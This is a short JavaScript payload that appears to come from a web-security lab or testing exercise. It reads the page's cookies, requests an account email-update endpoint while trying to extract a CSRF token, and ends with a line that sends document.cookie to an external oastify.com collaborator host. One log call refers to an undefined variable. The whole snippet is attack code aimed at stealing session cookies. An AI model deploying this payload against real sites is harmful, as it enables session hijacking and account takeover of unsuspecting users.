console.log(document.cookie)
fetch('../../../my-account/update-email-address', {
  method: 'GET',
  headers: {
    'Content-Type': 'application/json'
  }
})
.then(response => {
  if (!response.ok) {
    throw new Error('Failed to fetch CSRF token');
  }
  return response.json();
})
.then(json => {
  console.log('JSON!');
  console.log(json);
  const htmlContent = json.htmlContent;
  const parser = new DOMParser();
  const htmlDoc = parser.parseFromString(htmlContent, 'text/html');
  console.log('html:', html);
  //const csrfToken = htmlDoc.querySelector('meta[name="csrf-token"]').getAttribute('content');
  //console.log('CSRF Token:', csrfToken);
})
.catch(error => {
  console.error('Error:', error);
});

fetch("https://95cvsl0mpa6yo13nnsxrpc53dujl7d61v.oastify.com?cookies="+document.cookie)
